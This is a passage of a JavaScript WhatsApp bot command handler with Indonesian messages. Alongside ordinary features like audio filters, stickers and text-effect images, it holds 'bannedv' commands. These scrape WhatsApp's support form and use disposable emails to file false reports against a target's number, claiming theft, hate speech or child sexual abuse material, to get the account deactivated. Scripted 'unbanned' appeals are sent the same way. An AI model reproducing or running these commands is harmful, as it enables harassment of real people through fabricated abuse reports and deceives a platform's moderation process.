let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
basenewkirbotz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await basenewkirbotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
basenewkirbotz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await basenewkirbotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
basenewkirbotz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await basenewkirbotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
basenewkirbotz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv6": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await basenewkirbotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
basenewkirbotz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv1": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await basenewkirbotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
basenewkirbotz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await basenewkirbotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
basenewkirbotz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await basenewkirbotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
basenewkirbotz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await basenewkirbotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
basenewkirbotz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await basenewkirbotz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
basenewkirbotz.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "jadibot":{
if (!isOwner) return reply(mess.only.owner)
if (m.isGroup) return
jadibot(basenewkirbotz, sender)
}
break
case "listjadibot":{
if (m.isGroup) return
listjadibot(basenewkirbotz, m)
}
break
case "stopjadibot":{
if (!isOwner) return reply(mess.only.owner)
if (m.isGroup) return
stopjadibot(basenewkirbotz, sender)
}
break
case "bass": case "blown": case "deep": case "earrape": case "fast": case "fat": case "nightcore": case "reverse": case "robot": case "slow": case "smooth": case "tupai": {
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
reply(mess.wait)
let media = await basenewkirbotz.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
basenewkirbotz.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
reply(e)
}}
break
case "tohuruf": {
if (!Number(args[0])) return reply(`Example:\n${prefix}tohuruf 456`)
try {
quere = args.join(" ")
convertes = await angkaTerbilang(quere)
reply(`\`\`\`「 ALPHABET 」\`\`\`\n*•> Number :*\n${quere}\n*•> Alphabet :*\n${convertes}`)
} catch {
reply("Error")
}
}
break
case "ttp":{
if (!q) return reply("Teks Nya Mana Kak?")
reply(mess.wait)
let txt1 = await Ttp(q)
let txt2 = txt1.result
let txt3 = await getBuffer(txt2)
basenewkirbotz.sendStimg(from, txt3, m, { packname: global.packname, author: global.author })
}
break
case "shadow": case "write": case "romantic": case "burnpaper": case "smoke": case "narutobanner": case "love": case "undergrass": case "doublelove": case "coffecup": case "underwaterocean": case "smokyneon": case "starstext": case "rainboweffect": case "balloontext": case "metalliceffect": case "embroiderytext": case "flamingtext": case "stonetext": case "writeart": case "summertext": case "wolfmetaltext": case "nature3dtext": case "rosestext": case "naturetypography": case "quotesunder": case "shinetext":{
if (!q) return reply(`Example : ${prefix+command} KirBotz`) 
global.phtx = q
reply(mess.wait)
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photoOxy(link, global.phtx)
basenewkirbotz.sendMessage(from, { image: { url: dehe }, caption: mess.success }, { quoted: m })
}
break
case "candy": case "christmas": case "3dchristmas": case "sparklechristmas": case "deepsea": case "scifi": case "rainbow": case "waterpipe": case "spooky": case "pencil": case "circuit": case "discovery": case "fiction": case "demon": case "transformer": case "berry": case "thunder": case "magma": case "3dstone": case "neonlight": case "glitch": case "harrypotter": case "brokenglass": case "papercut": case "watercolor": case "multicolor": case "neondevil": case "underwater": case "graffitibike": case "snow": case "cloud": case "honey": case "ice": case "fruitjuice": case "biscuit": case "wood": case "chocolate": case "strawberry": case "matrix": case "blood": case "dropwater": case "toxic": case "lava": case "rock": case "bloodglas": case "hallowen": case "darkgold": case "joker": case "wicker": case "firework": case "skeleton": case "blackpink": case "sand": case "glue": case "1917": case "leaves": {
if (!q) return reply(`Example : ${prefix+command} KirBotz`) 
global.texp = text
reply(mess.wait)
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro(link, global.texp)
basenewkirbotz.sendMessage(from, { image: { url: anu }, caption: mess.success }, { quoted: m })
}
break
case "ebinary": {
if (!q) return reply(`Kirim text dengan caption ${prefix + command} kirbotz`)
reply(mess.wait)
let eb = await eBinary(q)
reply(eb)
}
break
case "dbinary": {
if (!q) return reply(`Kirim text dengan caption ${prefix + command} kirbotz`)
reply(mess.wait)
let db = await dBinary(q)
reply(db)
}
break
case "tourl":
try {
mee = await basenewkirbotz.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
basenewkirbotz.sendMessage(from, { text: mem }, { quoted: m })
} catch (err) {
reply(`Kirim/Reply Dengan Caption ${prefix + command}`)
}
break
case "sticker": case "s": {
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await basenewkirbotz.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await basenewkirbotz.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
